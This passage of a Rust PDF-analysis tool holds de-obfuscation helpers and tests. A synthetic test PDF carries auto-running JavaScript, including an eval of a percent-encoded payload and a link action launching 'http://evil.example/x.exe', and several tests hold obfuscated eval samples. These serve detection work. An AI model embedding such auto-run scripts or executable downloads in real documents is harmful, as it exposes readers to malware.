    let mut out = String::with_capacity(body.len());
    let mut i = 0;
    let mut hit = false;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() {
            let n = chars[i + 1];
            if (n == 'x' || n == 'X') && i + 3 < chars.len() {
                let hex: String = chars[i + 2..i + 4].iter().collect();
                if let Ok(v) = u32::from_str_radix(&hex, 16) {
                    if let Some(c) = char::from_u32(v) {
                        out.push(c);
                        i += 4;
                        hit = true;
                        continue;
                    }
                }
            }
            if n == 'u' && i + 5 < chars.len() && chars[i + 2] != '{' {
                let hex: String = chars[i + 2..i + 6].iter().collect();
                if let Ok(v) = u32::from_str_radix(&hex, 16) {
                    if let Some(c) = char::from_u32(v) {
                        out.push(c);
                        i += 6;
                        hit = true;
                        continue;
                    }
                }
            }
            if n.is_digit(8) {
                let mut j = i + 1;
                let mut digits = String::new();
                while j < chars.len() && digits.len() < 3 && chars[j].is_digit(8) {
                    digits.push(chars[j]);
                    j += 1;
                }
                if let Ok(v) = u32::from_str_radix(&digits, 8) {
                    if let Some(c) = char::from_u32(v) {
                        out.push(c);
                        i = j;
                        hit = true;
                        continue;
                    }
                }
            }
            // Any other escape (\n, \\, \", …) is preserved verbatim; quote_js
            // will re-emit it correctly from the decoded character.
            match n {
                'n' => out.push('\n'),
                'r' => out.push('\r'),
                't' => out.push('\t'),
                other => out.push(other),
            }
            i += 2;
            continue;
        }
        out.push(chars[i]);
        i += 1;
    }
    hit.then_some(out)
}

/// Fold `"a" + "b"` literal concatenation used to split identifiers.
fn pass_string_concat(src: &str) -> Option<String> {
    if !src.contains('+') {
        return None;
    }
    let chars: Vec<char> = src.chars().collect();
    let mut out = String::with_capacity(src.len());
    let mut i = 0;
    let mut hit = false;
    while i < chars.len() {
        if chars[i] == '"' || chars[i] == '\'' {
            if let Some((lit, mut next)) = read_literal(&chars, i) {
                let mut acc = lit;
                let mut merged = false;
                loop {
                    let plus = skip_ws(&chars, next);
                    if plus >= chars.len() || chars[plus] != '+' {
                        break;
                    }
                    let rhs = skip_ws(&chars, plus + 1);
                    let Some((lit2, after2)) = read_literal(&chars, rhs) else {
                        break;
                    };
                    acc.push_str(&lit2);
                    next = after2;
                    merged = true;
                }
                if merged {
                    // `acc` holds raw literal bodies; re-emit with the original
                    // escapes intact so no meaning changes.
                    out.push('"');
                    out.push_str(&acc.replace('"', "\\\""));
                    out.push('"');
                    i = next;
                    hit = true;
                    continue;
                }
                let q = chars[i];
                out.push(q);
                out.push_str(&acc);
                out.push(q);
                i = next;
                continue;
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    hit.then_some(out)
}

// --- small helpers --------------------------------------------------------

/// Pull URLs out of decoded source (scheme-anchored, no regex engine needed).
fn extract_urls(s: &str, out: &mut Vec<String>) {
    for scheme in ["https://", "http://", "ftp://", "file://"] {
        let mut start = 0;
        while let Some(pos) = s[start..].find(scheme) {
            let abs = start + pos;
            let rest = &s[abs..];
            let end = rest
                .find(|c: char| {
                    c.is_whitespace()
                        || matches!(c, '"' | '\'' | '`' | '<' | '>' | '(' | ')' | '[' | ']' | '{' | '}' | '\\' | ',' | ';')
                })
                .unwrap_or(rest.len());
            let url = rest[..end].trim_end_matches(['.', '!', '?']);
            if url.len() > scheme.len() {
                push_unique(out, url.to_string());
            }
            start = abs + scheme.len();
        }
    }
}

/// Push into a capped, de-duplicated list.
fn push_unique(v: &mut Vec<String>, s: String) {
    if s.is_empty() || v.len() >= 64 {
        return;
    }
    if !v.iter().any(|e| e == &s) {
        v.push(s);
    }
}

/// Cap a string at `max` characters, reporting whether it was cut.
fn cap(s: &str, max: usize) -> (String, bool) {
    if s.chars().count() > max {
        (s.chars().take(max).collect(), true)
    } else {
        (s.to_string(), false)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use lopdf::{Stream, StringFormat};

    fn name(s: &str) -> Object {
        Object::Name(s.as_bytes().to_vec())
    }
    fn lit(s: &str) -> Object {
        Object::String(s.as_bytes().to_vec(), StringFormat::Literal)
    }
    fn dict(pairs: Vec<(&str, Object)>) -> Dictionary {
        let mut d = Dictionary::new();
        for (k, v) in pairs {
            d.set(k.as_bytes().to_vec(), v);
        }
        d
    }

    /// A one-page PDF whose /OpenAction runs a percent-encoded payload, with a
    /// second script in the document-level name tree stored as a FlateDecode
    /// stream, and a third on an annotation's /AA mouse-enter event.
    fn scripted_pdf() -> Vec<u8> {
        let mut doc = Document::with_version("1.7");
        let pages_id = doc.new_object_id();

        let annot_action = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Action")),
            ("S", name("JavaScript")),
            ("JS", lit("app.launchURL(\"http://evil.example/x.exe\");")),
        ])));
        let annot = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Annot")),
            ("Subtype", name("Link")),
            (
                "AA",
                Object::Dictionary(dict(vec![("E", Object::Reference(annot_action))])),
            ),
        ])));
        let page_id = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Page")),
            ("Parent", Object::Reference(pages_id)),
            ("Annots", Object::Array(vec![Object::Reference(annot)])),
        ])));
        doc.objects.insert(
            pages_id,
            Object::Dictionary(dict(vec![
                ("Type", name("Pages")),
                ("Kids", Object::Array(vec![Object::Reference(page_id)])),
                ("Count", Object::Integer(1)),
            ])),
        );

        let open_action = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Action")),
            ("S", name("JavaScript")),
            (
                "JS",
                lit("eval(unescape(\"%61%70%70%2e%61%6c%65%72%74%28%31%29\"));"),
            ),
        ])));

        // Name-tree script held in a compressed stream.
        let mut stream = Stream::new(
            Dictionary::new(),
            b"var s = String.fromCharCode(117,116,105,108,46,112,114,105,110,116,102);".to_vec(),
        );
        stream.compress().unwrap();
        let js_stream = doc.add_object(Object::Stream(stream));
        let tree_action = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Action")),
            ("S", name("JavaScript")),
            ("JS", Object::Reference(js_stream)),
        ])));
        let names = doc.add_object(Object::Dictionary(dict(vec![(
            "JavaScript",
            Object::Dictionary(dict(vec![(
                "Names",
                Object::Array(vec![lit("Boot"), Object::Reference(tree_action)]),
            )])),
        )])));

        let catalog_id = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Catalog")),
            ("Pages", Object::Reference(pages_id)),
            ("OpenAction", Object::Reference(open_action)),
            ("Names", Object::Reference(names)),
        ])));
        doc.trailer
            .set(b"Root".to_vec(), Object::Reference(catalog_id));
        let mut buf = Vec::new();
        doc.save_to(&mut buf).unwrap();
        buf
    }

    /// A plain one-page PDF with no scripts at all.
    fn benign_pdf() -> Vec<u8> {
        let mut doc = Document::with_version("1.4");
        let pages_id = doc.new_object_id();
        let page_id = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Page")),
            ("Parent", Object::Reference(pages_id)),
        ])));
        doc.objects.insert(
            pages_id,
            Object::Dictionary(dict(vec![
                ("Type", name("Pages")),
                ("Kids", Object::Array(vec![Object::Reference(page_id)])),
                ("Count", Object::Integer(1)),
            ])),
        );
        let catalog_id = doc.add_object(Object::Dictionary(dict(vec![
            ("Type", name("Catalog")),
            ("Pages", Object::Reference(pages_id)),
        ])));
        doc.trailer
            .set(b"Root".to_vec(), Object::Reference(catalog_id));
        let mut buf = Vec::new();
        doc.save_to(&mut buf).unwrap();
        buf
    }

    #[test]
    fn extracts_every_trigger_and_decodes_the_open_action() {
        let r = extract(&scripted_pdf(), &Options::default()).expect("valid pdf");
        assert!(r.has_javascript);
        assert_eq!(r.script_count, 3, "open-action + name-tree + annotation");
        assert_eq!(r.page_count, 1);
        assert!(!r.encrypted);

        // document-open sorts first
        let open = &r.scripts[0];
        assert_eq!(open.trigger, "document-open");
        assert_eq!(open.location, "/OpenAction");
        assert_eq!(open.source_kind, "string");
        assert_eq!(open.decodings, vec!["percent-unescape"]);
        assert_eq!(open.rounds, 1);
        assert!(
            open.source.contains(r#"eval("app.alert(1)")"#),
            "percent-escaped payload decoded; got: {}",
            open.source
        );
        assert!(open.indicators.iter().any(|i| i == "eval"));

        // the name-tree script came from an inflated stream + fromCharCode
        let tree = r
            .scripts
            .iter()
            .find(|s| s.trigger == "document-level")
            .expect("name-tree script");
        assert_eq!(tree.source_kind, "stream");
        assert_eq!(tree.name.as_deref(), Some("Boot"));
        assert_eq!(tree.decodings, vec!["from-char-code"]);
        assert!(
            tree.source.contains(r#""util.printf""#),
            "fromCharCode decoded; got: {}",
            tree.source
        );

        // the annotation script yields the URL + the launchURL indicator
        let annot = r
            .scripts
            .iter()
            .find(|s| s.trigger == "annotation-action")
            .expect("annotation script");
        assert!(annot.location.ends_with("/AA/E"), "got {}", annot.location);
        assert_eq!(annot.urls, vec!["http://evil.example/x.exe"]);
        assert!(annot.indicators.iter().any(|i| i == "app.launchURL"));

        assert!(r.urls.iter().any(|u| u.contains("evil.example")));
        assert!(r.indicators.iter().any(|i| i.name == "eval"));
        assert!(!r.truncated);
    }

    #[test]
    fn benign_pdf_reports_no_javascript() {
        let r = extract(&benign_pdf(), &Options::default()).expect("valid pdf");
        assert!(!r.has_javascript);
        assert_eq!(r.script_count, 0);
        assert!(r.scripts.is_empty());
        assert!(r.indicators.is_empty());
        assert!(r
            .notes
            .iter()
            .any(|n| n.contains("no JavaScript found")));
    }

    #[test]
    fn non_pdf_bytes_error() {
        let err = extract(b"this is definitely not a pdf file", &Options::default()).unwrap_err();
        assert!(err.contains("failed to parse PDF"), "got: {err}");
    }

    #[test]
    fn deobfuscate_off_keeps_the_original_and_include_raw_adds_it() {
        let opts = Options {
            deobfuscate: false,
            beautify: false,
            include_raw: true,
            ..Options::default()
        };
        let r = extract(&scripted_pdf(), &opts).expect("valid pdf");
        let open = &r.scripts[0];
        assert!(open.decodings.is_empty());
        assert_eq!(open.rounds, 0);
        assert!(open.source.contains("%61%70%70"), "left untouched");
        assert_eq!(open.raw.as_deref(), Some(open.source.as_str()));
    }

    #[test]
    fn summary_mode_drops_source_but_keeps_metadata() {
        let r = extract(&scripted_pdf(), &Options::default())
            .expect("valid pdf")
            .summarized();
        assert_eq!(r.script_count, 3);
        assert!(r.scripts.iter().all(|s| s.source.is_empty()));
        assert!(r.scripts.iter().all(|s| s.raw.is_none()));
        // metadata survives
        assert!(r.scripts.iter().all(|s| !s.location.is_empty()));
        assert!(r.scripts.iter().any(|s| s.length > 0));
        assert!(!r.indicators.is_empty());
    }

    #[test]
    fn max_script_chars_truncates_and_is_reported() {
        let opts = Options {
            max_script_chars: 12,
            ..Options::default()
        };
        let r = extract(&scripted_pdf(), &opts).expect("valid pdf");
        assert!(r.truncated);
        assert!(r.scripts.iter().any(|s| s.truncated));
        assert!(r.scripts.iter().all(|s| s.source.chars().count() <= 12));
    }

    // --- de-obfuscation passes -------------------------------------------

    fn deob(src: &str) -> (String, Vec<&'static str>) {
        let mut used = BTreeSet::new();
        let (out, _) = deobfuscate(src, &mut used);
        (out, used.into_iter().collect())
    }

    #[test]
    fn from_char_code_decimal_and_hex() {
        let (out, used) = deob("var a = String.fromCharCode(101, 0x76, 97, 108);");
        assert_eq!(out, r#"var a = "eval";"#);
        assert_eq!(used, vec!["from-char-code"]);
    }

    #[test]
    fn percent_and_u_escapes() {
        let (out, _) = deob(r#"unescape("%41%uD83D%uDE00%42")"#);
        assert!(out.starts_with(r#""A"#), "got {out}");
        assert!(out.contains('B'), "got {out}");
        let (out2, used) = deob(r#"decodeURIComponent("a%2Fb")"#);
        assert_eq!(out2, r#""a/b""#);
        assert_eq!(used, vec!["percent-unescape"]);
    }

    #[test]
    fn base64_atob_decodes() {
        let (out, used) = deob(r#"eval(atob("YXBwLmFsZXJ0KDEp"))"#);
        assert_eq!(out, r#"eval("app.alert(1)")"#);
        assert_eq!(used, vec!["base64-atob"]);
    }

    #[test]
    fn string_escapes_and_concat_fold() {
        let (out, used) = deob(r#"var x = "\x65\x76" + "al";"#);
        assert_eq!(out, r#"var x = "eval";"#);
        assert!(used.contains(&"string-escapes"), "got {used:?}");
        assert!(used.contains(&"string-concat"), "got {used:?}");
    }

    #[test]
    fn nested_layers_unwrap_over_several_rounds() {
        // atob → fromCharCode → the real call.
        let inner = "String.fromCharCode(97,112,112,46,97,108,101,114,116,40,49,41)";
        let b64 = base64::engine::general_purpose::STANDARD.encode(inner);
        let src = format!(r#"eval(atob("{b64}"))"#);
        let mut used = BTreeSet::new();
        let (out, rounds) = deobfuscate(&src, &mut used);
        assert_eq!(out, r#"eval("app.alert(1)")"#, "both layers unwrapped");
        assert!(rounds >= 2, "took {rounds} rounds");
        assert!(used.contains("base64-atob") && used.contains("from-char-code"));
    }

    #[test]
    fn plain_source_is_left_alone() {
        let (out, used) = deob("app.alert('hello');");
        assert_eq!(out, "app.alert('hello');");
        assert!(used.is_empty());
    }

    #[test]
    fn urls_are_extracted_and_trimmed() {
        let mut urls = Vec::new();
        extract_urls(
            "get(\"https://a.example/p?q=1\"); // see http://b.example/x.\n",
            &mut urls,
        );
        assert_eq!(
            urls,
            vec!["https://a.example/p?q=1", "http://b.example/x"]
        );
    }
}
